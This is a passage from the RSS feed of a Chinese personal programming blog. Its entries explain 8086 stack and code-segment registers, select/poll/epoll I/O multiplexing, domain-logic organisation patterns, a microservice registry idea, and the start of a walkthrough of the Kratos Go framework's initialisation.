&lt;p>To be continued&amp;hellip;&lt;/p></description></item><item><title>SS:SP鸡你太美存器</title><link>https://sdttttt.github.io/blog/sssp/</link><pubDate>Mon, 06 Apr 2020 16:38:01 +0800</pubDate><guid>https://sdttttt.github.io/blog/sssp/</guid><description>
&lt;p>如今的CPU都有提供栈机制，8086也不例外。&lt;/p>
&lt;p>8086提供的最基本的两个指令就是&lt;code>push&lt;/code> and &lt;code>pop&lt;/code>.&lt;/p>
&lt;pre>&lt;code>push ax ;将寄存器ax中的数据送入栈顶
pop ax ;将栈顶的数据送入ax
&lt;/code>&lt;/pre>&lt;p>我们知道CS:IP寄存器存放了下一条指令的段地址和偏移地址，那么CPU是如何知道栈顶在哪呐？
显然也有两个寄存器专门存放栈顶的地址，那就是SS:SP寄存器，SS = 段地址， SP = 偏移地址&lt;/p>
&lt;p>任意时刻，SS:SP都指向栈顶元素。&lt;code>push&lt;/code>和&lt;code>pop&lt;/code>指令执行时CPU将从SS和SP中获得栈顶的地址。&lt;/p>
&lt;p>&lt;code>push&lt;/code> 有2步:&lt;/p>
&lt;ul>
&lt;li>SP -= 2 SS:SP指向栈顶前面的单元，以这个位置为新栈。&lt;/li>
&lt;li>将AX中的内容送入 SS:SP 所指的位置.&lt;/li>
&lt;/ul>
&lt;pre>&lt;code>10000H |_______|
|_______|
|_______|
|_______|
|_______|
|_______|
|_______|
|_______|
|_______|
|_______|
1000EH |__23___| &amp;lt;= SS:SP
1000FH |__01___|
&lt;/code>&lt;/pre>&lt;pre>&lt;code>10000H |_______|
|_______|
|_______|
|_______|
|_______|
|_______|
|_______|
|_______|
|_______| &amp;lt;= SS:SP: 换个位置
|_______|
1000EH |__23___|
1000FH |__01___|
&lt;/code>&lt;/pre>&lt;pre>&lt;code>10000H |_______|
|_______|
|_______|
|_______|
|_______|
|_______|
|_______|
|_______| ;来自ax寄存器的数据
|__54___| &amp;lt;= SS:SP: 换个位置
|__11___|
1000EH |__23___|
1000FH |__01___|
&lt;/code>&lt;/pre>&lt;hr>
&lt;p>假设 10000H -&amp;gt; 1000FH 这段空间是栈，那么栈空时，SS:SP在呐？&lt;/p>
&lt;pre>&lt;code>10000H |_______|
|_______|
|_______|
|_______|
|_______|
|_______|
|_______|
|_______|
|_______|
|_______|
1000EH |_______|
1000FH |_______| &amp;lt;= SS:SP: 我在这？
&lt;/code>&lt;/pre>&lt;pre>&lt;code>10000H |_______|
|_______|
|_______|
|_______|
|_______|
|_______|
|_______|
|_______|
|_______|
|_______|
1000EH |_______|
1000FH |_______|
10010H |_______| &amp;lt;= SS:SP: 其实爷在这里。
&lt;/code>&lt;/pre>&lt;p>至于为什么只要想想 &lt;code>SP -= 2&lt;/code> 你就知道了。&lt;/p>
&lt;h1 id="关于爆栈">关于爆栈&lt;/h1>
&lt;p>栈一旦爆了，SS:SP就会指到别的地方去。
这么一想CPU应该会知道栈顶在哪里。&lt;/p>
&lt;p>每次&lt;code>push&lt;/code>,&lt;code>pop&lt;/code>都会检查栈顶和栈底的位置，保证栈不会超。这么一想美滋滋。&lt;/p>
&lt;p>然而，8086CPU并没有做这样的设计。
它只知道栈顶在哪里。不知道栈有多大。&lt;/p>
&lt;p>换个说法就是：&lt;strong>只知道下一条指令在哪里，而不知道要处理的指令有多少条。&lt;/strong>&lt;/p></description></item><item><title>CSIP鸡你太美存器</title><link>https://sdttttt.github.io/blog/csip/</link><pubDate>Mon, 06 Apr 2020 15:35:44 +0800</pubDate><guid>https://sdttttt.github.io/blog/csip/</guid><description>
&lt;p>之前刚学的时候对这个玩意音响没那么深刻，现在再学，感觉很不一样了。&lt;/p>
&lt;p>CS为代码段寄存器，IP为指令指针寄存器。
设CS = M, IP = N, 8086CPU将从 &lt;code>M × 16 + N&lt;/code> 处读取指令并进行。&lt;/p>
&lt;p>也可以这样表述： &lt;strong>8086CPU中，任意时刻，CPU都会将CS:IP指向的内容做为执行指令.&lt;/strong>&lt;/p>
&lt;p>执行流程:&lt;/p>
&lt;ul>
&lt;li>初始状态: CS = 2000H, IP = 0000H&lt;/li>
&lt;li>CS:IP 内容送入地址加法器，2000H × 16 + 0000H = 20000H&lt;/li>
&lt;li>地址加法器计算出物理地址20000H后将结果送入输入输出电路.&lt;/li>
&lt;li>输入输出电路将物理地址20000H送到地址总线。&lt;/li>
&lt;li>内存将物理地址20000H上存放的机器指令X通过数据总线送入CPU.&lt;/li>
&lt;li>输入输出电路将机器指令X送入指令缓冲器。&lt;/li>
&lt;li>寄存器IP的值自动增加。&lt;/li>
&lt;li>以此类推&amp;hellip;&lt;/li>
&lt;/ul>
&lt;hr>
&lt;p>当8086CPU加点或者复位后，CS = FFFFH, IP = 0000H,也就是CPU清晨起床做的第一件事就是去执行FFFF0H内存单元中存放的机器指令。&lt;/p>
&lt;h2 id="修改csip">修改CS:IP&lt;/h2>
&lt;p>&lt;code>mov&lt;/code>指令能帮我们将值送入寄存器。但是，它不能用于修改CS:IP，原因很简单8086出于设计考量不允许。
能修改CS:IP的指令统称为&lt;code>转移指令&lt;/code>（以后我们深入研究）,现在我学习第一个可以修改CS:IP寄存器的指令，&lt;code>jmp&lt;/code>.&lt;/p>
&lt;p>若想同时修改CS:IP寄存器,可以用&lt;code>jmp 段地址, 偏移地址&lt;/code>的指令来完成。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre class="chroma">&lt;code class="language-asm" data-lang="asm">&lt;span class="nf">jmp&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="no">AE3&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">3&lt;/span> &lt;span class="c">;执行后: CS = 2AE3H IP = 0003H, CPU 将从这2AE33H 处读取指令
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>如果只想修改IP寄存器, 可以用&lt;code>jmp 寄存器&lt;/code>的指令来完成.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre class="chroma">&lt;code class="language-asm" data-lang="asm">&lt;span class="nf">jmp&lt;/span> &lt;span class="no">ax&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>类似, &lt;code>mov IP, ax&lt;/code>&lt;/p></description></item><item><title>MultiplexingIO</title><link>https://sdttttt.github.io/blog/multiplexingio/</link><pubDate>Mon, 06 Apr 2020 12:42:26 +0800</pubDate><guid>https://sdttttt.github.io/blog/multiplexingio/</guid><description>
&lt;p>其实“I/O多路复用”这个坑爹翻译可能是这个概念在中文里面如此难理解的原因。所谓的I/O多路
复用在英文中其实叫 I/O multiplexing. 如果你搜索multiplexing啥意思,基本上都会出这个图:&lt;/p>
&lt;p>&lt;img src="https://sdttttt.github.io/multiplexIO/1.png" alt="">&lt;/p>
&lt;p>于是大部分人都直接联想到&amp;quot;一根网线,多个sock复用&amp;quot; 这个概念,包括上面的几个回答, 其实不
管你用多进程还是I/O多路复用, 网线都只有一根好伐。&lt;strong>多个Sock复用一根网线这个功能是在内核
+驱动层实现的.&lt;/strong>&lt;/p>
&lt;p>&lt;strong>重要的事情再说一遍: I/O multiplexing 这里面的 multiplexing 指的其实是在单个线程通过记
录跟踪每一个Sock(I/O流)的状态(对应空管塔里面的Fight progress strip槽)来同时管理多个I/O
流.&lt;/strong> 发明它的原因,是尽量多的提高服务器的吞吐能力。&lt;/p>
&lt;p>是不是听起来好拗口,看个图就懂了.&lt;/p>
&lt;p>&lt;img src="https://sdttttt.github.io/multiplexIO/2.png" alt="">&lt;/p>
&lt;p>在同一个线程里面, 通过拨开关的方式,来同时传输多个I/O流, (学过EE的人现在可以站出来义正
严辞说这个叫“时分复用”了)。&lt;/p>
&lt;p>什么,你还没有搞懂 “一个请求到来了,nginx使用epoll接收请求的过程是怎样的”, 多看看这个
图就了解了。提醒下,ngnix会有很多链接进来, epoll会把他们都监视起来,然后像拨开关一样,
谁有数据就拨向谁,然后调用相应的代码处理。&lt;/p>
&lt;hr>
&lt;p>了解这个基本的概念以后,其他的就很好解释了。&lt;/p>
&lt;p>&lt;strong>select, poll, epoll 都是I/O多路复用的具体的实现,之所以有这三个鬼存在,其实是他们出现是有
先后顺序的。&lt;/strong>&lt;/p>
&lt;p>I/O多路复用这个概念被提出来以后, select是第一个实现 (1983 左右在BSD里面实现的)。&lt;/p>
&lt;p>select 被实现以后,很快就暴露出了很多问题。&lt;/p>
&lt;ul>
&lt;li>select 会修改传入的参数数组,这个对于一个需要调用很多次的函数,是非常不友好的。&lt;/li>
&lt;li>select 如果任何一个sock(I/O stream)出现了数据,select 仅仅会返回,但是并不会告诉你是那
个sock上有数据,于是你只能自己一个一个的找,10几个sock可能还好,要是几万的sock每次&lt;/li>
&lt;li>select 不是线程安全的,如果你把一个sock加入到select, 然后突然另外一个线程发现,尼玛,这
个sock不用,要收回。对不起,这个select 不支持的,如果你丧心病狂的竟然关掉这个sock,
select的标准行为是。。呃。。不可预测的, 这个可是写在文档中的哦.&lt;/li>
&lt;/ul>
&lt;blockquote>
&lt;p>“If a file descriptor being monitored by select() is closed in another thread, the result is
unspecified.”&lt;/p>
&lt;/blockquote>
&lt;p>于是14年以后(1997年)一帮人又实现了poll, poll 修复了select的很多问题,比如:&lt;/p>
&lt;ul>
&lt;li>poll 去掉了1024个链接的限制,于是要多少链接呢, 主人你开心就好。&lt;/li>
&lt;li>poll 从设计上来说,不再修改传入数组,不过这个要看你的平台了,所以行走江湖,还是小心为
妙.&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>其实拖14年那么久也不是效率问题, 而是那个时代的硬件实在太弱,一台服务器处理1千多个链接
简直就是神一样的存在了,select很长段时间已经满足需求。&lt;/strong>&lt;/p>
&lt;hr>
&lt;p>于是5年以后, 在2002, 大神 Davide Libenzi 实现了epoll.&lt;/p>
&lt;p>epoll 可以说是I/O 多路复用最新的一个实现,epoll 修复了poll 和select绝大部分问题, 比如:&lt;/p>
&lt;ul>
&lt;li>epoll 现在是线程安全的。&lt;/li>
&lt;li>epoll 现在不仅告诉你sock组里面数据,还会告诉你具体哪个sock有数据,你不用自己去找了。&lt;/li>
&lt;/ul>
&lt;p>可是epoll 有个致命的缺点。。只有linux支持。比如BSD上面对应的实现是kqueue。&lt;/p>
&lt;p>其实有些国内知名厂商把epoll从安卓里面裁掉这种脑残的事情我会主动告诉你嘛。什么,你说没人
用安卓做服务器,尼玛你是看不起p2p软件了啦。&lt;/p>
&lt;p>而ngnix 的设计原则里面, 它会使用目标平台上面最高效的I/O多路复用模型咯,所以才会有这个
设置。一般情况下,如果可能的话,尽量都用epoll/kqueue吧。&lt;/p></description></item><item><title>领域逻辑的组织模式</title><link>https://sdttttt.github.io/blog/domain-logic-org-mode/</link><pubDate>Fri, 03 Apr 2020 20:58:28 +0800</pubDate><guid>https://sdttttt.github.io/blog/domain-logic-org-mode/</guid><description>
&lt;p>目前领域逻辑的组织模式分为三种，“事务脚本”，“领域模型” 以及 “表模块”。&lt;/p>
&lt;p>&lt;code>事务脚本&lt;/code>类似于&lt;code>面向过程&lt;/code>编程，事务脚本有以下优点：&lt;/p>
&lt;ul>
&lt;li>它是一种大多数软件工程师都能理解的简单过程模型。&lt;/li>
&lt;li>它能和一个行数据入口或表数据入口简单的数据源很好的协作。&lt;/li>
&lt;li>非常容易设定事务的边界。&lt;/li>
&lt;/ul>
&lt;p>一个组数据源操作便是一个独立的事务脚本。
当然事务脚本也存在很大的缺陷，当领域逻辑开始变得复杂时，这些缺点就开始暴露出来。
当几个事务要执行类似的逻辑时，通常几个脚本中会含有某些相同的代码。
通过将这些代码提取出来，来形成公共的子例程，来消除这种情况。
但是，很多时候消除副本会变得棘手，而检测副本则更困难，倒是消除副本后的程序反而比以前还要杂乱无章，难以维护。&lt;/p>
&lt;p>复杂的领域逻辑，必然要引入对象，解决前面描述问题的面向对象方法就是&lt;code>领域模型&lt;/code>。
一个内容管理系统会有用户，文章等类，进行鉴权，以及写入等逻辑均置于领域模型中。
因此，发布对象调用一次写入方法。
可能还会有其他例程来完成一些读取功能，但它其实都是调用领域模型中已有打方法实现的。&lt;/p>
&lt;blockquote>
&lt;p>领域模型的控制不再是由一个过程来控制用户某一个动作的逻辑，而是由每个对象都承担一部分相关逻辑。&lt;/p>
&lt;/blockquote>
&lt;p>领域模型的开销来自于数据源的复杂度和使用上的复杂性，刚刚接触领域模型的人会需要时间来适应这种思维方式。一旦习惯了，你就会很爽！
另一方面你需要将数据源映射到领域模型上，数据源越是复杂，领域模型的效果就越是显著。&lt;/p>
&lt;p>&lt;img src="https://sdttttt.github.io/shiwujiaoben.png" alt="">&lt;/p>
&lt;p>上为事务脚本&lt;/p>
&lt;p>&lt;img src="https://sdttttt.github.io/lingyumoxing.png" alt="">&lt;/p>
&lt;p>上为领域模型&lt;/p>
&lt;p>第三中为领域逻辑的组织模式为&lt;code>表模块&lt;/code>，它处于&lt;code>事务脚本&lt;/code>和&lt;code>领域模型&lt;/code>的一个中间地带。
和领域模型最大的区别就是在表模块中一个表只对应一个实例，而领域模型一行数据便能对应一个实例。&lt;/p>
&lt;p>表模块的优点在于可以很容易的和软件架构中已经存在的部分衔接，很多GUI应用都是假定将其与SQL查询结果的记录集结果协同工作的。表模块就工作在记录集之上。你可以很容易的使用。&lt;/p>
&lt;p>&lt;img src="https://sdttttt.github.io/tablemodule.png" alt="">&lt;/p>
&lt;h2 id="抉择">抉择&lt;/h2>
&lt;p>&lt;img src="https://sdttttt.github.io/modelfuzadu.png" alt="">&lt;/p>
&lt;p>别问，问就，直接使用领域模型。&lt;/p>
&lt;p>接下来我稍微介绍一下目前各个框架/库在领域逻辑的组织模式上的选择（只列出我用）：&lt;/p>
&lt;ul>
&lt;li>
&lt;p>PHP&lt;/p>
&lt;ul>
&lt;li>PHP 原生 &amp;lt;事务脚本&amp;gt;&lt;/li>
&lt;li>ThinkPHP &amp;lt;领域模型&amp;gt;&lt;/li>
&lt;li>Laravel &amp;lt;领域模型&amp;gt;&lt;/li>
&lt;li>YII &amp;lt;领域模型&amp;gt;&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>Java&lt;/p>
&lt;ul>
&lt;li>java.sql.* &amp;lt;事务脚本&amp;gt;&lt;/li>
&lt;li>MyBatis &amp;lt;表模块&amp;gt;&lt;/li>
&lt;li>JPA &amp;lt;领域模型&amp;gt;&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>Go&lt;/p>
&lt;ul>
&lt;li>gorm &amp;lt;表模块 | 领域模型&amp;gt; （这个比较神奇）&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;p>现在用表模块的人普遍比较多，我曾遇到好几个J2EE工程师都并不喜欢&lt;code>JPA&lt;/code>的思维模式。&lt;/p></description></item><item><title>About the Blog</title><link>https://sdttttt.github.io/blog/about_blog/</link><pubDate>Fri, 03 Apr 2020 15:36:02 +0800</pubDate><guid>https://sdttttt.github.io/blog/about_blog/</guid><description>
&lt;p>&lt;code>blog&lt;/code>里的文章并非全部原创，有一部分是经过修改后整理出&lt;code>要点&lt;/code>，集中一起写到这里面。也包涵了一些我对整个软件行业的想法。&lt;/p>
&lt;hr>
&lt;p>这个&lt;code>blog&lt;/code>是用&lt;code>Hugo&lt;/code>构建的，Theme使用的是&lt;code>rocinante&lt;/code>,live2D的纸片人是我自己加的.(不是主题里自带的).&lt;/p>
&lt;p>我之前还使用过&lt;code>Vuepress&lt;/code>做为静态网站生成器，不过自定义程度很低，也不是很复合我的审美。（我希望是旁边不要出现目录栏）&lt;/p>
&lt;p>后面我就转战&lt;code>Hugo&lt;/code>,优点：用Go编写，生成快。生态圈也比较良好。我第一个使用的Theme是&lt;code>book&lt;/code>，不得不说，配置复杂，我就马上丢弃了，后面又使用了&lt;code>Ezhi&lt;/code>，由于我不是很喜欢红色，就又扔了。&lt;/p>
&lt;p>然后就使用了现在这个Theme，还是比较满意的，很极简。后面也加了&lt;code>utteranc&lt;/code>做为评论模块，选择utteranc的理由很简单，最初&lt;code>Hugo&lt;/code>是自带&lt;code>Disqus&lt;/code>做为评论模块的，但是无奈这个&lt;code>Disqus&lt;/code>在国外，而且还是被墙的！&lt;/p>
&lt;p>后来暂时搁了一段时间，才找到&lt;code>utteranc&lt;/code>，优点就是结合&lt;code>Github issues&lt;/code>无需翻墙，使用的UI也是Github的（Github使用的UI是Bootstrap库），而且零配置，授权一下App，改一下JS的tag马上就可以用。&lt;/p></description></item><item><title>只需要服务中心</title><link>https://sdttttt.github.io/blog/onlyhub/</link><pubDate>Thu, 02 Apr 2020 15:58:01 +0800</pubDate><guid>https://sdttttt.github.io/blog/onlyhub/</guid><description>
&lt;p>目前，市面上以及出现了各种各样的适用于微服务(下面简称ms)的注册中心，配合其使用的还有各种ms框架，例如Alibaba的&lt;code>Dubbo&lt;/code>。&lt;/p>
&lt;p>微服务能通过分解服务粒度，然后针对特定服务进行性能扩展，来达到高性能的目的。&lt;/p>
&lt;p>其中服务中心负责服务的注册和生命周期管理，&lt;code>Dubbo&lt;/code>之类的微服务框架则对服务的注册, 负载均衡，服务鉴权, 服务调用等一系列操作做封装，供用户调用.&lt;/p>
&lt;p>使得用户不用去关心微服务的实现细节。&lt;/p>
&lt;hr>
&lt;p>我的想法相反，或许能让服务中心做更多的事。&lt;/p>
&lt;p>我们可以从头，去设计一个服务中心：&lt;/p>
&lt;ul>
&lt;li>只管理服务名和服务地址。&lt;/li>
&lt;li>消费端索取服务时，则由服务中心来做负载均衡和一些额外的工作，直接给出服务提供方地址。&lt;/li>
&lt;/ul>
&lt;p>其他的功能可以按照现有的服务注册中心来设计。&lt;/p>
&lt;p>关于微服务的调用，则由服务注册中心提供一个微服务库，来供我们调用，或者由用户自己实现。这个架构下，就不需要&lt;code>Dubbo&lt;/code>之类的RPC框架。&lt;/p>
&lt;p>优点：模块减少，开发可能会成本减少。&lt;/p>
&lt;p>缺点：需要服务中心来提供微服务调用库。（而且服务中心处理的东西变多了，不知道性能会有多少影响）&lt;/p>
&lt;p>目前小生已经搞了一个类似这中服务注册中心的Demo，可以参考。&lt;/p>
&lt;p>&lt;a href="https://github.com/sdttttt/go-tds">https://github.com/sdttttt/go-tds&lt;/a>&lt;/p>
&lt;p>（这只是一个我突发的灵感罢了，其实挺荒唐的。）&lt;/p></description></item><item><title>Kratos 初始化流程源码解析</title><link>https://sdttttt.github.io/blog/kratos/</link><pubDate>Tue, 31 Mar 2020 20:17:28 +0800</pubDate><guid>https://sdttttt.github.io/blog/kratos/</guid><description>
&lt;p>&lt;strong>Kratos&lt;/strong> 是bilibili开源的一套Go微服务框架，包含大量微服务相关框架及工具。&lt;/p>
&lt;blockquote>
&lt;p>名字来源于:《战神》游戏以希腊神话为背景，讲述由凡人成为战神的奎托斯（Kratos）成为战神并展开弑神屠杀的冒险历程。&lt;/p>
&lt;/blockquote>
&lt;p>好！开始吧！&lt;/p>
&lt;p>&lt;em>小提示：阅读源码时请保持清醒。&lt;/em>&lt;/p>
&lt;p>首先是按照Kratos tool 生产的工程目录。&lt;/p>
&lt;pre>&lt;code>├── CHANGELOG.md
├── OWNERS
├── README.md
├── api # api目录为对外保留的proto文件及生成的pb.go文件
│ ├── api.bm.go
│ ├── api.pb.go # 通过go generate生成的pb.go文件
│ ├── api.proto
│ └── client.go
├── cmd
│ └── main.go # cmd目录为main所在
├── configs # configs为配置文件目录
│ ├── application.toml # 应用的自定义配置文件，可能是一些业务开关如：useABtest = true
│ ├── db.toml # db相关配置
│ ├── grpc.toml # grpc相关配置
│ ├── http.toml # http相关配置
│ ├── memcache.toml # memcache相关配置
│ └── redis.toml # redis相关配置
├── go.mod
├── go.sum
└── internal # internal为项目内部包，包括以下目录：
│ ├── dao # dao层，用于数据库、cache、MQ、依赖某业务grpc|http等资源访问
│ │ ├── dao.bts.go
│ │ ├── dao.go
│ │ ├── db.go
│ │ ├── mc.cache.go
│ │ ├── mc.go
│ │ └── redis.go
│ ├── di # 依赖注入层 采用wire静态分析依赖
│ │ ├── app.go
│ │ ├── wire.go # wire 声明
│ │ └── wire_gen.go # go generate 生成的代码
│ ├── model # model层，用于声明业务结构体
│ │ └── model.go
│ ├── server # server层，用于初始化grpc和http server
│ │ ├── grpc # grpc层，用于初始化grpc server和定义method
│ │ │ └── server.go
│ │ └── http # http层，用于初始化http server和声明handler
│ │ └── server.go
│ └── service # service层，用于业务逻辑处理，且为方便http和grpc共用方法，建议入参和出参保持grpc风格，且使用pb文件生成代码
│ └── service.go
└── test # 测试资源层 用于存放测试相关资源数据 如docker-compose配置 数据库初始化语句等
└── docker-compose.yaml
&lt;/code>&lt;/pre>&lt;h2 id="entry">Entry&lt;/h2>
&lt;p>入口在&lt;code>cmd/main.go&lt;/code>下，我们进去看看。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="kd">func&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// 没什么好说的，参数解析
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">flag&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Parse&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="nx">log&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Init&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kc">nil&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1">// debug flag: log.dir={path}
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">defer&lt;/span> &lt;span class="nx">log&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Close&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="nx">log&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Info&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;kratos-demo start&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="c1">// -conf 参数的解析
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">paladin&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Init&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="c1">// 这里是 `深坑的入口`
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// 一会分析
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">_&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">closeFunc&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">di&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">InitApp&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nb">panic&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">err&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// os.Signal 是一个系统信号接收channel
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">c&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nb">make&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kd">chan&lt;/span> &lt;span class="nx">os&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Signal&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="c1">// syscall 都是一些系统信号
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">signal&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Notify&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">syscall&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">SIGHUP&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">syscall&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">SIGQUIT&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">syscall&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">SIGTERM&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">syscall&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">SIGINT&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// 一旦有信号进来了，看下面的代码逻辑，八成是关闭这个应用。
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">s&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="o">&amp;lt;-&lt;/span>&lt;span class="nx">c&lt;/span>
&lt;span class="nx">log&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Info&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;get a signal %s&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">s&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">String&lt;/span>&lt;span class="p">())&lt;/span>
&lt;span class="k">switch&lt;/span> &lt;span class="nx">s&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="nx">syscall&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">SIGQUIT&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">syscall&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">SIGTERM&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">syscall&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">SIGINT&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="nf">closeFunc&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="nx">log&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Info&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;kratos-demo exit&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">time&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Sleep&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">time&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Second&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">return&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="nx">syscall&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">SIGHUP&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="k">default&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="k">return&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="initializer">Initializer&lt;/h2>
&lt;p>接下来我们去看&lt;code>di.InitApp()&lt;/code>里做了什么。&lt;/p>
&lt;p>这个方法是通过&lt;code>github.com/google/wire&lt;/code>来生成.&lt;/p>
&lt;p>如果你不知道&lt;code>wire&lt;/code>可以参考下面的官方原话：&lt;/p>
&lt;blockquote>
&lt;p>Wire is a code generation tool that automates connecting components using dependency injection. Dependencies between components are represented in Wire as function parameters, encouraging explicit initialization instead of global variables. Because Wire operates without runtime state or reflection, code written to be used with Wire is useful even for hand-written initialization.&lt;/p>
&lt;/blockquote>
&lt;blockquote>
